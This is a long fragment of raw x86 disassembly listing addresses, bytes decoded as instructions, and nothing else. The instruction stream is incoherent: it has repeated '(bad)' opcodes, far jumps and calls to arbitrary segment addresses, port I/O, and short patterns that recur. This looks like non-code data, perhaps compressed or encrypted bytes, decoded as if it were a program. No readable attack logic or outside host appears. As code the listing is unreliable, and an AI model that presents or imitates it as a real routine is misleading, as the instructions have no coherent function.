  412ece:	pop    eax
  412ecf:	add    BYTE PTR [ebx+0x40],al
  412ed2:	bound  ecx,QWORD PTR [edi]
  412ed4:	inc    eax
  412ed5:	push   ebx
  412ed6:	push   es
  412ed7:	inc    ecx
  412ed8:	fsub   QWORD PTR [edx+0x43]
  412edb:	pop    ebx
  412edc:	cs mov bl,0xa5
  412edf:	inc    edx
  412ee0:	setno  BYTE PTR [edx-0x15]
  412ee4:	sub    eax,0xc5b43b4a
  412ee9:	dec    esp
  412eea:	cmp    al,0xf8
  412eec:	sbb    al,BYTE PTR [eax]
  412eee:	add    BYTE PTR [eax+0x40],al
  412ef1:	cmovno eax,DWORD PTR ds:0x40056243
  412ef8:	int3   
  412ef9:	add    ah,cl
  412efb:	inc    eax
  412efc:	inc    eax
  412efd:	bound  eax,QWORD PTR [ecx+0x0]
  412f00:	add    BYTE PTR [edi],cl
  412f02:	inc    ebx
  412f03:	inc    eax
  412f04:	inc    eax
  412f05:	add    BYTE PTR [ecx+0x43],al
  412f08:	add    eax,0x40256240
  412f0d:	bound  eax,QWORD PTR [eax]
  412f0f:	xor    eax,0xc14b00e1
  412f14:	fcom   st(6)
  412f16:	sub    edi,DWORD PTR [eax]
  412f18:	inc    eax
  412f19:	test   al,0xd8
  412f1b:	mov    eax,ds:0x1f1a15a8
  412f20:	loope  0x412f65
  412f22:	clc    
  412f23:	rcl    DWORD PTR [edx],0x4e
  412f26:	aas    
  412f27:	cmp    BYTE PTR [eax+0x2a],cl
  412f2a:	jmp    0xe31f:0x78ff5840
  412f31:	adc    BYTE PTR [ebx+0x1],ah
  412f34:	adc    dl,bh
  412f36:	in     eax,0x50
  412f38:	scas   eax,DWORD PTR es:[edi]
  412f39:	dec    eax
  412f3a:	rol    BYTE PTR ds:0x4140cc00,cl
  412f40:	inc    eax
  412f41:	inc    ebx
  412f42:	bound  esp,QWORD PTR ds:0x41400043
  412f48:	add    BYTE PTR [eax],al
  412f4a:	add    eax,0x43624062
  412f4f:	inc    ecx
  412f50:	inc    eax
  412f51:	inc    eax
  412f52:	inc    eax
  412f53:	add    eax,0x40624340
  412f58:	add    eax,0x40664140
  412f5d:	mov    al,ds:0x514ad4cb
  412f62:	dec    ebp
  412f63:	add    eax,0xd404ce8
  412f68:	bound  edi,QWORD PTR [ecx-0x1e]
  412f6b:	inc    esp
  412f6c:	ins    DWORD PTR es:[edi],dx
  412f6d:	lds    eax,FWORD PTR [eax+0x41]
  412f70:	das    
  412f71:	xor    DWORD PTR [eax+0x45],esp
  412f74:	and    eax,0x43304c
  412f79:	add    eax,0x41107840
  412f7e:	bound  eax,QWORD PTR [eax+0x40]
  412f81:	sldt   WORD PTR [eax-0x34]
  412f85:	js     0x412fe9
  412f87:	add    eax,0x40664143
  412f8c:	inc    ebx
  412f8d:	add    BYTE PTR [ecx+0x5],al
  412f90:	js     0x412fd2
  412f92:	bound  eax,QWORD PTR [eax+0x0]
  412f95:	inc    eax
  412f96:	ret    
  412f97:	popa   
  412f98:	dec    eax
  412f99:	dec    ebx
  412f9a:	sub    al,0x66
  412f9c:	inc    ebp
  412f9d:	jno    0x412fce
  412f9f:	jecxz  0x412f51
  412fa1:	loop   0x412f6d
  412fa3:	out    0x65,al
  412fa5:	test   al,0xf9
  412fa7:	mov    ebp,0x5401374
  412fac:	ins    BYTE PTR es:[edi],dx
  412fad:	inc    eax
  412fae:	rcl    BYTE PTR [edx-0x42],cl
  412fb1:	dec    ecx
  412fb2:	inc    ecx
  412fb3:	inc    ebx
  412fb4:	inc    eax
  412fb5:	inc    eax
  412fb6:	add    eax,0x434162
  412fbb:	inc    eax
  412fbc:	add    BYTE PTR [edx+0x5],ah
  412fbf:	inc    eax
  412fc0:	adc    BYTE PTR [edx+0x40],ah
  412fc3:	inc    ebx
  412fc4:	inc    ecx
  412fc5:	add    eax,0x4340
  412fca:	add    eax,0x404162
  412fcf:	add    BYTE PTR [eax+0x43],al
  412fd2:	inc    eax
  412fd3:	add    eax,0x2a621b15
  412fd8:	add    eax,0x68a148e1
  412fdd:	cli    
  412fde:	rcl    BYTE PTR [ecx],0x41
  412fe1:	imul   edi,DWORD PTR [ebp+0x40f8162f],0x47a95ba4
  412feb:	mov    eax,ds:0x4c40e4a8
  412ff0:	enter  0xb94f,0x49
  412ff4:	inc    eax
  412ff5:	add    BYTE PTR [eax],al
  412ff7:	inc    ecx
  412ff8:	inc    ebx
  412ff9:	add    eax,0x41784062
  412ffe:	inc    eax
  412fff:	inc    eax
  413000:	add    BYTE PTR [edi],cl
  413002:	bound  eax,QWORD PTR [ebx+0x0]
  413005:	add    eax,0x25006240
  41300a:	inc    eax
  41300b:	add    eax,0x40254143
  413010:	add    eax,0x42620000
  413015:	inc    ax
  413017:	ja     0x413046
  413019:	loope  0x41306b
  41301b:	pusha  
  41301c:	sub    bh,BYTE PTR [esi+0x48f8d4a2]
  413022:	and    esi,DWORD PTR [esi+0x62c1e241]
  413028:	shl    BYTE PTR [edx-0x38],1
  41302b:	out    dx,al
  41302c:	jg     0x413084
  41302e:	inc    ebx
  41302f:	inc    eax
  413030:	pop    edi
  413031:	and    esp,DWORD PTR [ecx]
  413033:	data16 in al,0xb1
  413036:	inc    ebx
  413037:	inc    esi
  413038:	scas   eax,DWORD PTR es:[edi]
  413039:	push   ss
  41303a:	loopne 0x41309c
  41303c:	(bad)  
  41303d:	loopne 0x413082
  41303f:	add    BYTE PTR [eax],al
  413041:	add    BYTE PTR [ecx+0x40],al
  413044:	bound  esp,QWORD PTR [esi+0x0]
  413047:	inc    eax
  413048:	add    eax,0x5400000
  41304d:	inc    ecx
  41304e:	inc    eax
  41304f:	inc    eax
  413050:	bound  esp,QWORD PTR ds:0x25050043
  413056:	inc    ecx
  413057:	inc    ebx
  413058:	inc    eax
  413059:	test   BYTE PTR [eax+0x0],al
  41305c:	bound  ebx,QWORD PTR [eax+0x62]
  41305f:	inc    ecx
  413060:	inc    eax
  413061:	cmp    al,0x39
  413063:	into   
  413064:	loop   0x41301b
  413066:	pusha  
  413067:	cld    
  413068:	pop    ecx
  413069:	int    0xf0
  41306b:	or     eax,0x54610633
  413070:	mov    ebp,0x2c0e0354
  413075:	mov    eax,ds:0x11de62ae
  41307a:	dec    ecx
  41307b:	adc    BYTE PTR [edx+0x40],ah
  41307e:	inc    ecx
  41307f:	and    eax,0x40000500
  413084:	inc    ebx
  413085:	add    eax,0x40624041
  41308a:	inc    ebx
  41308b:	add    eax,0x43402541
  413090:	bound  eax,QWORD PTR [eax+0x43]
  413093:	int3   
  413094:	inc    eax
  413095:	bound  eax,QWORD PTR [eax]
  413097:	inc    ecx
  413098:	inc    eax
  413099:	inc    eax
  41309a:	add    eax,0x2064f605
  41309f:	adc    ebx,DWORD PTR [edi]
  4130a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a2:	xchg   esi,eax
  4130a3:	arpl   cx,di
  4130a5:	mov    ch,0x73
  4130a7:	pop    esp
  4130a8:	xor    al,0xbd
  4130aa:	push   edx
  4130ab:	sub    ah,cl
  4130ad:	sub    eax,0xdc632f5b
  4130b2:	or     eax,0x636d05a4
  4130b7:	inc    edi
  4130b8:	add    eax,0x67643d0d
  4130bd:	in     eax,0xbf
  4130bf:	and    DWORD PTR [ebp+eiz*1+0x43ebdc40],ebx
  4130c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c7:	push   esi
  4130c8:	arpl   si,sp
  4130ca:	inc    eax
  4130cb:	test   al,0x62
  4130cd:	inc    eax
  4130ce:	and    eax,0x5406600
  4130d3:	inc    ebx
  4130d4:	inc    ecx
  4130d5:	inc    eax
  4130d6:	inc    eax
  4130d7:	inc    ebx
  4130d8:	add    BYTE PTR [eax],al
  4130da:	add    BYTE PTR [edx-0x34],ah
  4130dd:	inc    eax
  4130de:	add    eax,0x40004041
  4130e3:	inc    ecx
  4130e4:	int3   
  4130e5:	add    BYTE PTR [ebx-0x7c],al
  4130e8:	add    eax,0x5406240
  4130ed:	(bad)  
  4130ee:	clc    
  4130ef:	and    esp,DWORD PTR [ebp+ebp*8+0x2c]
  4130f3:	stc    
  4130f4:	inc    edx
  4130f5:	adc    edx,ecx
  4130f7:	inc    ebp
  4130f8:	xor    ah,BYTE PTR [eax-0x58]
  4130fb:	sbb    DWORD PTR [edi],ebp
  4130fd:	and    DWORD PTR [edi-0x1d],ecx
  413100:	xchg   edx,eax
  413101:	test   eax,0x87b83541
  413106:	retf   0xe178
  413109:	out    dx,eax
  41310a:	sub    al,BYTE PTR [edi+0x3d]
  41310d:	(bad)  
  41310e:	enter  0x4be3,0x45
  413112:	adc    DWORD PTR [ecx-0x3f],eax
  413115:	stos   DWORD PTR es:[edi],eax
  413116:	dec    edi
  413117:	jne    0x41313c
  413119:	arpl   WORD PTR [eax+0x77],cx
  41311c:	mov    eax,0x5569a911
  413121:	sub    ecx,DWORD PTR ds:0xc65947cc
  413127:	arpl   WORD PTR [ecx+0x61],sp
  41312a:	inc    eax
  41312b:	bound  ebx,QWORD PTR [eax+0x41]
  41312e:	add    eax,0x40404340
  413133:	inc    ebx
  413134:	inc    eax
  413135:	test   BYTE PTR [eax],al
  413137:	add    eax,0x40624041
  41313c:	inc    eax
  41313d:	add    BYTE PTR [edx+0x5],ah
  413140:	inc    ebx
  413141:	add    BYTE PTR [eax+0x78],al
  413144:	inc    ecx
  413145:	add    BYTE PTR [eax+0x41],bl
  413148:	bound  eax,QWORD PTR [ecx+eax*2+0x27]
  41314c:	gs dec edi
  41314e:	mov    cl,0x4c
  413150:	inc    eax
  413151:	ins    DWORD PTR es:[edi],dx
  413152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413153:	call   0x220fda9a
  413158:	pusha  
  413159:	in     al,dx
  41315a:	test   eax,0x21c4c952
  41315f:	push   es
  413160:	bound  edi,QWORD PTR es:[ebx+eax*8+0x8440bc]
  413168:	int3   
  413169:	bound  eax,QWORD PTR ds:0xcc840f41
  41316f:	inc    ebx
  413170:	add    BYTE PTR [eax+0x0],al
  413173:	inc    eax
  413174:	inc    eax
  413175:	inc    eax
  413176:	int3   
  413177:	add    BYTE PTR ds:0x62404341,al
  41317d:	pop    eax
  41317e:	add    BYTE PTR [ebx+0x40],al
  413181:	bound  ecx,QWORD PTR [edi]
  413183:	inc    eax
  413184:	dec    edi
  413185:	aas    
  413186:	loop   0x41316c
  413188:	sti    
  413189:	add    eax,0x4ba905b8
  41318e:	cmp    ah,BYTE PTR [edx]
  413190:	inc    ecx
  413191:	leave  
  413192:	or     DWORD PTR [ecx-0x3e],eax
  413195:	popa   
  413196:	inc    BYTE PTR [ebx]
  413198:	xor    esp,edi
  41319a:	add    BYTE PTR [eax],al
  41319c:	inc    eax
  41319d:	inc    eax
  41319e:	cmovno eax,DWORD PTR ds:0x40056243
  4131a5:	int3   
  4131a6:	add    ah,cl
  4131a8:	inc    eax
  4131a9:	inc    eax
  4131aa:	bound  eax,QWORD PTR [ecx+0x0]
  4131ad:	add    BYTE PTR [edi],cl
  4131af:	inc    ebx
  4131b0:	inc    eax
  4131b1:	inc    eax
  4131b2:	add    BYTE PTR [ecx+0x43],al
  4131b5:	add    eax,0x40256240
  4131ba:	bound  eax,QWORD PTR [eax]
  4131bc:	push   esi
  4131bd:	push   ds
  4131be:	dec    edi
  4131bf:	sbb    eax,0x55bf7857
  4131c4:	bound  ecx,QWORD PTR [ecx+ebp*4-0x405b5f57]
  4131cb:	add    al,0xe2
  4131cd:	(bad)  
  4131ce:	shl    BYTE PTR [eax+0x24],0x24
  4131d2:	lods   eax,DWORD PTR ds:[esi]
  4131d3:	int    0xab
  4131d5:	push   ecx
  4131d6:	add    eax,0xcc000559
  4131db:	inc    eax
  4131dc:	inc    ecx
  4131dd:	inc    eax
  4131de:	inc    ebx
  4131df:	bound  esp,QWORD PTR ds:0x41400043
  4131e5:	add    BYTE PTR [eax],al
  4131e7:	add    eax,0x43624062
  4131ec:	inc    ecx
  4131ed:	inc    eax
  4131ee:	inc    eax
  4131ef:	inc    eax
  4131f0:	add    eax,0x40624340
  4131f5:	add    eax,0x40664140
  4131fa:	pusha  
  4131fb:	stos   BYTE PTR es:[edi],al
  4131fc:	mov    edi,0xc9414740
  413201:	popa   
  413202:	popa   
  413203:	pop    edx
  413204:	test   al,0x91
  413206:	imul   esp,DWORD PTR ds:[esi],0x42a30b69
  41320d:	dec    ecx
  41320e:	aad    0x67
  413210:	inc    ecx
  413211:	sub    esp,DWORD PTR [edx+0x4c651f44]
  413217:	bound  esp,QWORD PTR [edi+0xce00961]
  41321d:	ror    cl,0xd4
  413220:	and    BYTE PTR [esi-0x36],ah
  413223:	mov    esp,0x43b8f962
  413228:	add    BYTE PTR ds:0x41107840,al
  41322e:	bound  eax,QWORD PTR [eax+0x40]
  413231:	sldt   WORD PTR [eax-0x34]
  413235:	js     0x413299
  413237:	add    eax,0x40664143
  41323c:	inc    ebx
  41323d:	add    BYTE PTR [ecx+0x5],al
  413240:	js     0x413282
  413242:	bound  eax,QWORD PTR [eax+0x0]
  413245:	inc    eax
  413246:	enter  0x6544,0xe1
  41324a:	dec    ebp
  41324b:	and    eax,0x2ccb418a
  413250:	cmp    al,0x57
  413252:	mov    ds:0xbfe40524,eax
  413257:	mov    ds:0xf505633,eax
  41325d:	fdivr  QWORD PTR [edi+0x61c78fd5]
  413263:	int3   
  413264:	daa    
  413265:	push   edx
  413266:	test   DWORD PTR [ebx+0x9],edi
  413269:	popa   
  41326a:	push   ebx
  41326b:	mov    ah,0x88
  41326d:	adc    BYTE PTR [edi+0x60f7e2e6],ah
  413273:	inc    ecx
  413274:	inc    ebx
  413275:	inc    eax
  413276:	inc    eax
  413277:	add    eax,0x434162
  41327c:	inc    eax
  41327d:	add    BYTE PTR [edx+0x5],ah
  413280:	inc    eax
  413281:	adc    BYTE PTR [edx+0x40],ah
  413284:	inc    ebx
  413285:	inc    ecx
  413286:	add    eax,0x4340
  41328b:	add    eax,0x404162
  413290:	add    BYTE PTR [eax+0x43],al
  413293:	inc    eax
  413294:	add    eax,0x436c7b3f
  413299:	inc    esp
  41329a:	xor    ecx,DWORD PTR [esi+0x21]
  41329d:	test   al,0xbd
  41329f:	lds    esp,FWORD PTR [esp+ebp*1]
  4132a2:	push   cs
  4132a3:	gs push esi
  4132a5:	push   0xffffff86
  4132a7:	dec    esp
  4132a8:	cmp    BYTE PTR [eiz*8+0x7bdb6209],0x73
  4132b0:	(bad)  
  4132b1:	int    0x3f
  4132b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b4:	popf   
  4132b5:	bound  edi,QWORD PTR [ebp-0x42bd34bf]
  4132bb:	add    BYTE PTR [edi],0x8
  4132be:	test   BYTE PTR [eax+0x4063],ah
  4132c4:	inc    ecx
  4132c5:	inc    ebx
  4132c6:	add    eax,0x41784062
  4132cb:	inc    eax
  4132cc:	inc    eax
  4132cd:	add    BYTE PTR [edi],cl
  4132cf:	bound  eax,QWORD PTR [ebx+0x0]
  4132d2:	add    eax,0x25006240
  4132d7:	inc    eax
  4132d8:	add    eax,0x40254143
  4132dd:	add    eax,0xfe620000
  4132e2:	inc    esi
  4132e3:	popa   
  4132e4:	data16 and BYTE PTR ds:0xa14425c3,al
  4132eb:	test   BYTE PTR [ebx+esi*1],bh
  4132ee:	cmp    al,BYTE PTR [ebp+0x2b]
  4132f1:	sub    al,0x57
  4132f3:	popa   
  4132f4:	outs   dx,BYTE PTR ds:[esi]
  4132f5:	int3   
  4132f6:	jmp    0x404d:0xe13a34df
  4132fd:	inc    eax
  4132fe:	clc    
  4132ff:	loopne 0x413369
  413301:	lds    eax,FWORD PTR [ecx+0x23]
  413304:	and    BYTE PTR [ecx],al
  413306:	adc    BYTE PTR [edx+0x2a],0x42
  41330a:	pusha  
  41330b:	dec    ebx
  41330c:	cmp    ch,BYTE PTR [ebx-0x1bbfeeb]
  413312:	cmp    ah,BYTE PTR [ecx]
  413314:	inc    ebx
  413315:	clc    
  413316:	ja     0x4132be
  413318:	sub    al,BYTE PTR [ebx+0x0]
  41331b:	add    BYTE PTR [eax],al
  41331d:	inc    ecx
  41331e:	inc    eax
  41331f:	bound  esp,QWORD PTR [esi+0x0]
  413322:	inc    eax
  413323:	add    eax,0x5400000
  413328:	inc    ecx
  413329:	inc    eax
  41332a:	inc    eax
  41332b:	bound  esp,QWORD PTR ds:0x25050043
  413331:	inc    ecx
  413332:	inc    ebx
  413333:	inc    eax
  413334:	test   BYTE PTR [eax+0x0],al
  413337:	bound  ebx,QWORD PTR [eax+0x62]
  41333a:	inc    ecx
  41333b:	inc    eax
  41333c:	pop    edi
  41333d:	dec    BYTE PTR [eax+eiz*2+0x45]
  413341:	out    dx,eax
  413342:	jl     0x413347
  413344:	and    BYTE PTR [eax-0x1f],al
  413347:	mov    esp,0x34d5fa87
  41334c:	cmp    BYTE PTR [ecx],ah
  41334e:	push   ebp
  41334f:	dec    esi
  413350:	dec    edx
  413351:	or     BYTE PTR [ebx+eax*2-0x2b],0xd5
  413356:	and    ecx,esp
  413358:	inc    esp
  413359:	xchg   esp,eax
  41335a:	jae    0x41336d
  41335c:	jg     0x4132ff
  41335e:	mov    edi,0xb8aa4015
  413363:	push   esp
  413364:	neg    BYTE PTR [ecx+0x4d]
  413367:	inc    esi
  413368:	sbb    al,0xfe
  41336a:	adc    eax,0x23245a66
  41336f:	popa   
  413370:	addr16 add eax,0x103c69cb
  413376:	bound  eax,QWORD PTR [eax+0x41]
  413379:	and    eax,0x40000500
  41337e:	inc    ebx
  41337f:	add    eax,0x40624041
  413384:	inc    ebx
  413385:	add    eax,0x43402541
  41338a:	bound  eax,QWORD PTR [eax+0x43]
  41338d:	int3   
  41338e:	inc    eax
  41338f:	bound  eax,QWORD PTR [eax]
  413391:	inc    ecx
  413392:	inc    eax
  413393:	inc    eax
  413394:	add    eax,0x44782505
  413399:	ds push 0xffffffa9
  41339c:	and    BYTE PTR [esi],dh
  41339e:	outs   dx,BYTE PTR ds:[esi]
  41339f:	loope  0x4133c1
  4133a1:	test   al,0x96
  4133a3:	xchg   ecx,eax
  4133a4:	push   eax
  4133a5:	int    0xe4
  4133a7:	and    BYTE PTR [eax+0x46],0xfc
  4133ab:	mov    esp,0xa10c6508
  4133b0:	out    0x2a,eax
  4133b2:	adc    eax,0x5fe2a80d
  4133b7:	dec    eax
  4133b8:	bound  eax,QWORD PTR [eax+0x25]
  4133bb:	add    BYTE PTR [esi+0x40],ah
  4133be:	add    eax,0x40404143
  4133c3:	inc    ebx
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	add    BYTE PTR [edx-0x34],ah
  4133c9:	inc    eax
  4133ca:	add    eax,0x40004041
  4133cf:	inc    ecx
  4133d0:	int3   
  4133d1:	add    BYTE PTR [ebx-0x7c],al
  4133d4:	add    eax,0x5406240
  4133d9:	bound  esi,QWORD PTR [ecx]
  4133db:	inc    ecx
  4133dc:	push   0xa35f684a
  4133e1:	and    DWORD PTR [edx+0x4e],eax
  4133e4:	loop   0x4133ee
  4133e6:	sub    ah,BYTE PTR [eax]
  4133e8:	jne    0x413438
  4133ea:	and    bh,BYTE PTR [eax]
  4133ec:	cli    
  4133ed:	mov    al,0x42
  4133ef:	xor    al,0x74
  4133f1:	mov    ds:0x6219282d,al
  4133f6:	dec    edx
  4133f7:	(bad)
  4133fa:	sbb    al,0x4d
  4133fc:	xor    eax,0x3a4b2088
  413401:	xchg   esp,eax
  413402:	loope  0x413425
  413404:	inc    esi
  413405:	dec    ebx
  413406:	inc    ebx
  413407:	(bad)  
  413408:	test   al,0xe5
  41340a:	pop    es
  41340b:	sub    BYTE PTR [ecx+0x3f],al
  41340e:	xor    al,0xf8
  413410:	inc    eax
  413411:	bound  ebx,QWORD PTR [eax+0x41]
  413414:	add    eax,0x40404340
  413419:	inc    ebx
  41341a:	inc    eax
  41341b:	test   BYTE PTR [eax],al
  41341d:	add    eax,0x40624041
  413422:	inc    eax
  413423:	add    BYTE PTR [edx+0x5],ah
  413426:	inc    ebx
  413427:	add    BYTE PTR [eax+0x78],al
  41342a:	inc    ecx
  41342b:	add    BYTE PTR [eax+0x41],bl
  41342e:	bound  ecx,QWORD PTR [ecx]
  413430:	cld    
  413431:	mov    eax,ds:0x54bf4b62
  413436:	clc    
  413437:	dec    edx
  413438:	mov    ds:0xbff8409b,al
  41343d:	inc    ecx
  41343e:	adc    eax,0x1e07bba1
  413443:	push   es
  413444:	mov    edi,0x2753c901
  413449:	bound  esp,QWORD PTR [edi+0x6b]
  41344c:	gs addr16 mov eax,es:0x1041
  413452:	(bad)  
  413453:	xor    DWORD PTR [eax+0x35],eax
  413456:	xchg   edx,eax
  413457:	jnp    0x413479
  413459:	push   0x35018ca8
  41345e:	jae    0x4134c1
  413460:	ss loope 0x4134a8
  413463:	inc    ebp
  413464:	mov    al,ds:0x8440f684
  413469:	add    ah,cl
  41346b:	bound  eax,QWORD PTR ds:0xcc840f41
  413471:	inc    ebx
  413472:	add    BYTE PTR [eax+0x0],al
  413475:	inc    eax
  413476:	inc    eax
  413477:	inc    eax
  413478:	int3   
  413479:	add    BYTE PTR ds:0x62404341,al
  41347f:	pop    eax
  413480:	add    BYTE PTR [ebx+0x40],al
  413483:	bound  ecx,QWORD PTR [edi]
  413485:	inc    eax
  413486:	inc    ebx
  413487:	push   es
  413488:	dec    ebx
  413489:	sub    dh,BYTE PTR [ecx]
  41348b:	dec    esp
  41348c:	mov    es,WORD PTR [ebp+0x61]
  41348f:	popa   
  413490:	loope  0x4134d3
  413492:	imul   edx,ebp,0x40724d91
  413498:	dec    edi
  413499:	dec    esi
  41349a:	call   0xa2a0:0x63a0bf44
  4134a1:	cmp    al,0x6b
  4134a3:	dec    edx
  4134a4:	retf   0x9ff4
  4134a7:	sub    al,0x26
  4134a9:	sub    cl,dl
  4134ab:	add    BYTE PTR [eax],al
  4134ad:	inc    eax
  4134ae:	inc    eax
  4134af:	cmovno eax,DWORD PTR ds:0x40056243
  4134b6:	int3   
  4134b7:	add    ah,cl
  4134b9:	inc    eax
  4134ba:	inc    eax
  4134bb:	bound  eax,QWORD PTR [ecx+0x0]
  4134be:	add    BYTE PTR [edi],cl
  4134c0:	inc    ebx
  4134c1:	inc    eax
  4134c2:	inc    eax
  4134c3:	add    BYTE PTR [ecx+0x43],al
  4134c6:	add    eax,0x40256240
  4134cb:	bound  eax,QWORD PTR [eax]
  4134cd:	cli    
  4134ce:	cli    
  4134cf:	add    eax,0x4d184559
  4134d4:	cwde   
  4134d5:	xor    BYTE PTR [edx+0x4a],ah
  4134d8:	loope  0x4134bb
  4134da:	loop   0x413505
  4134dc:	push   ebx
  4134dd:	ror    al,0xfa
  4134e0:	(bad)  
  4134e2:	or     BYTE PTR [eax],ch
  4134e4:	mov    ch,0xe0
  4134e6:	inc    esi
  4134e7:	clc    
  4134e8:	popa   
  4134e9:	loope  0x4134e5
  4134eb:	jp     0x413483
  4134ed:	test   eax,0x1b17f229
  4134f2:	dec    edx
  4134f3:	adc    al,0x15
  4134f5:	bound  esi,QWORD PTR [edx+0x5]
  4134f8:	add    ah,cl
  4134fa:	inc    eax
  4134fb:	inc    ecx
  4134fc:	inc    eax
  4134fd:	inc    ebx
  4134fe:	bound  esp,QWORD PTR ds:0x41400043
  413504:	add    BYTE PTR [eax],al
  413506:	add    eax,0x43624062
  41350b:	inc    ecx
  41350c:	inc    eax
  41350d:	inc    eax
  41350e:	inc    eax
  41350f:	add    eax,0x40624340
  413514:	add    eax,0x40664140
  413519:	adc    eax,0xa6677865
  41351e:	pusha  
  41351f:	shr    DWORD PTR [eax+0x5a1554b],0x62
  413526:	mov    cl,BYTE PTR [ecx+0x78]
  413529:	jmp    DWORD PTR [edi-0x7d]
  41352c:	mov    al,ds:0xa299416
  413531:	inc    ebx
  413532:	add    BYTE PTR ds:0x41107840,al
  413538:	bound  eax,QWORD PTR [eax+0x40]
  41353b:	sldt   WORD PTR [eax-0x34]
  41353f:	js     0x4135a3
  413541:	add    eax,0x40664143
  413546:	inc    ebx
  413547:	add    BYTE PTR [ecx+0x5],al
  41354a:	js     0x41358c
  41354c:	bound  eax,QWORD PTR [eax+0x0]
  41354f:	inc    eax
  413550:	cli    
  413551:	jno    0x413574
  413553:	je     0x413501
  413555:	inc    ebx
  413556:	lds    esp,FWORD PTR [edx-0x10]
  413559:	in     eax,0x17
  41355b:	jl     0x4135bf
  41355d:	test   eax,0x410d404c
  413562:	mov    al,ds:0xcb924622
  413567:	push   eax
  413568:	dec    ebx
  413569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41356a:	inc    ecx
  41356b:	inc    ebx
  41356c:	inc    eax
  41356d:	inc    eax
  41356e:	add    eax,0x434162
  413573:	inc    eax
  413574:	add    BYTE PTR [edx+0x5],ah
  413577:	inc    eax
  413578:	adc    BYTE PTR [edx+0x40],ah
  41357b:	inc    ebx
  41357c:	inc    ecx
  41357d:	add    eax,0x4340
  413582:	add    eax,0x404162
  413587:	add    BYTE PTR [eax+0x43],al
  41358a:	inc    eax
  41358b:	add    eax,0x87ee6d25
  413590:	xchg   esp,eax
  413591:	inc    eax
  413592:	jmp    DWORD PTR [eax+0x3]
  413595:	dec    ebp
  413596:	test   al,0xa9
  413598:	xadd   cl,bh
  41359b:	mov    eax,ds:0x9044a022
  4135a0:	bound  ebp,QWORD PTR [eax]
  4135a2:	out    dx,al
  4135a3:	jle    0x413558
  4135a5:	adc    ebp,DWORD PTR [edx]
  4135a7:	dec    ecx
  4135a8:	cmp    eax,0x40a14312
  4135ad:	add    BYTE PTR [eax],al
  4135af:	inc    ecx
  4135b0:	inc    ebx
  4135b1:	add    eax,0x41784062
  4135b6:	inc    eax
  4135b7:	inc    eax
  4135b8:	add    BYTE PTR [edi],cl
  4135ba:	bound  eax,QWORD PTR [ebx+0x0]
  4135bd:	add    eax,0x25006240
  4135c2:	inc    eax
  4135c3:	add    eax,0x40254143
  4135c8:	add    eax,0x40620000
  4135cd:	inc    eax
  4135ce:	inc    edx
  4135cf:	mov    cl,0x40
  4135d1:	mov    BYTE PTR [edx+0x529429bf],ch
  4135d7:	mov    es,WORD PTR [eax+0x15]
  4135da:	in     al,dx
  4135db:	addr16 test al,0x12
  4135de:	cmp    BYTE PTR [eax+0x40],ch
  4135e1:	int    0x43
  4135e3:	add    BYTE PTR [eax],al
  4135e5:	add    BYTE PTR [ecx+0x40],al
  4135e8:	bound  esp,QWORD PTR [esi+0x0]
  4135eb:	inc    eax
  4135ec:	add    eax,0x5400000
  4135f1:	inc    ecx
  4135f2:	inc    eax
  4135f3:	inc    eax
  4135f4:	bound  esp,QWORD PTR ds:0x25050043
  4135fa:	inc    ecx
  4135fb:	inc    ebx
  4135fc:	inc    eax
  4135fd:	test   BYTE PTR [eax+0x0],al
  413600:	bound  ebx,QWORD PTR [eax+0x62]
  413603:	inc    ecx
  413604:	inc    eax
  413605:	adc    eax,0x2843016d
  41360a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41360b:	mov    ds:0x21364b11,eax
  413610:	mov    al,ds:0xa8b88c51
  413615:	(bad)  
  413616:	sub    DWORD PTR [ebp+0x27],ebp
  413619:	and    DWORD PTR [ecx+0x3d],ebp
  41361c:	dec    eax
  41361d:	cli    
  41361e:	push   esp
  41361f:	jmp    0x113a5ea3
  413624:	bound  eax,QWORD PTR [eax+0x41]
  413627:	and    eax,0x40000500
  41362c:	inc    ebx
  41362d:	add    eax,0x40624041
  413632:	inc    ebx
  413633:	add    eax,0x43402541
  413638:	bound  eax,QWORD PTR [eax+0x43]
  41363b:	int3   
  41363c:	inc    eax
  41363d:	bound  eax,QWORD PTR [eax]
  41363f:	inc    ecx
  413640:	inc    eax
  413641:	inc    eax
  413642:	add    eax,0xea63c105
  413647:	stos   DWORD PTR es:[edi],eax
  413648:	imul   esp,ecx,0x17
  41364b:	inc    bp
  41364d:	and    al,0x43
  41364f:	ins    BYTE PTR es:[edi],dx
  413650:	loope  0x413693
  413652:	xor    eax,0xea620519
  413657:	and    eax,DWORD PTR [eax+eiz*2]
  41365a:	jp     0x413691
  41365c:	and    al,0x2c
  41365e:	pop    ds
  41365f:	pop    edx
  413660:	fs and eax,0x8c6845eb
  413666:	stc    
  413667:	gs test eax,0xab4c625b
  41366d:	arpl   ax,bp
  41366f:	pop    esp
  413670:	ins    DWORD PTR es:[edi],dx
  413671:	and    dl,BYTE PTR [edi*1-0x1cfadaf0]
  413678:	pusha  
  413679:	mov    esp,0xac8d42fc
  41367e:	inc    ecx
  41367f:	in     al,0x62
  413681:	inc    eax
  413682:	and    eax,0x5406600
  413687:	inc    ebx
  413688:	inc    ecx
  413689:	inc    eax
  41368a:	inc    eax
  41368b:	inc    ebx
  41368c:	add    BYTE PTR [eax],al
  41368e:	add    BYTE PTR [edx-0x34],ah
  413691:	inc    eax
  413692:	add    eax,0x40004041
  413697:	inc    ecx
  413698:	int3   
  413699:	add    BYTE PTR [ebx-0x7c],al
  41369c:	add    eax,0x5406240
  4136a1:	bound  esi,QWORD PTR [eax]
  4136a3:	sbb    ah,BYTE PTR [esi+0x1]
  4136a6:	shl    BYTE PTR [edx+0x48],0x5
  4136aa:	ins    DWORD PTR es:[edi],dx
  4136ab:	dec    edx
  4136ac:	es jl  0x413724
  4136af:	add    al,dh
  4136b1:	inc    esi
  4136b2:	mov    ds:0xf1623c20,eax
  4136b7:	inc    eax
  4136b8:	bound  ebx,QWORD PTR [eax+0x41]
  4136bb:	add    eax,0x40404340
  4136c0:	inc    ebx
  4136c1:	inc    eax
  4136c2:	test   BYTE PTR [eax],al
  4136c4:	add    eax,0x40624041
  4136c9:	inc    eax
  4136ca:	add    BYTE PTR [edx+0x5],ah
